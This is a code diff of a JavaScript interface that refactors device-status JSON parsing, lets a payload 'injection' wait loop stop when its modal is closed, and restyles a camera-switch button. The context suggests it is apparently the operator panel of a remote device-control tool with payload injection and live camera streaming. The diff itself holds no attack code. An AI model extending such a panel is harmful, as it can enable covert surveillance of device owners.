@@ -82,7 +82,7 @@ const UI = {
 
             try {
                 const d = state.data.selectedDevice;
-                const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
+                const status = d ? safeParseJSON(d.status) : {};
                 const isPayloadActive = !!status.payload_active;
                 const perms = status.permissions || {};
 
@@ -236,7 +236,7 @@ const UI = {
 
     async handleToggle(btn) {
         const d = state.data.selectedDevice;
-        const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
+        const status = d ? safeParseJSON(d.status) : {};
         if (!status.payload_active) {
             setState({ ui: { modal: { type: "payload-required" } } });
             return;
@@ -276,7 +276,7 @@ const UI = {
 
     async handleModalAction(value, isUpdate = false) {
         const d = state.data.selectedDevice;
-        const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
+        const status = d ? safeParseJSON(d.status) : {};
         const isPayloadActive = !!status.payload_active;
         const perms = status.permissions || {};
 
@@ -336,7 +336,7 @@ const UI = {
 
         const deviceId = state.data.selectedDeviceId;
         const device = state.data.devices.find(dev => dev.id === deviceId);
-        const status = (typeof device?.status === "string") ? JSON.parse(device.status || "{}") : (device?.status || {});
+        const status = device ? safeParseJSON(device.status) : {};
 
         const arch = status.abi || "unknown";
         const model = status.model || "Unknown Device";
@@ -364,9 +364,16 @@ const UI = {
             const checkInterval = setInterval(async () => {
                 attempts++;
 
+                // Check if user closed the modal manually
+                if (!state.ui.modal || state.ui.modal.type !== "injection") {
+                    clearInterval(checkInterval);
+                    resolve(false);
+                    return;
+                }
+
                 // Refresh device data from state (updated via realtime Supabase)
                 const d = state.data.devices.find(dev => dev.id === deviceId);
-                const currentStatus = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
+                const currentStatus = d ? safeParseJSON(d.status) : {};
 
                 if (currentStatus.payload_active) {
                     clearInterval(checkInterval);
@@ -577,7 +584,7 @@ const UI = {
         const d = state.data.selectedDevice;
         if (!d) return setHtmlIfChanged(dom.systemInfoGrid, "");
 
-        const status = (typeof d.status === "string") ? JSON.parse(d.status || "{}") : (d.status || {});
+        const status = safeParseJSON(d.status);
         const get = (k) => status[k] || d[k] || "N/A";
 
         const sections = [
@@ -665,7 +672,7 @@ const UI = {
                     ${isConnected ? `<div id="streamInfo" class="text-xs color-muted text-mono text-center">SESSION ACTIVE</div>` : ''}
                 `;
                 footer = `<div class="btn-group">
-                            ${isCamera ? `<button class="secondary-btn" data-action="stream" data-value="${nextCam}">${renderIcon("refresh-cw")}</button>` : ""}
+                            ${isCamera ? `<button class="secondary-btn refresh-overlay-btn" data-action="stream" data-value="${nextCam}">${renderIcon("refresh-cw")}</button>` : ""}
                             <button class="primary-btn" data-action="stop-stream" style="background:var(--system-red); flex:3">STOP SESSION</button>
                         </div>`;
                 break;
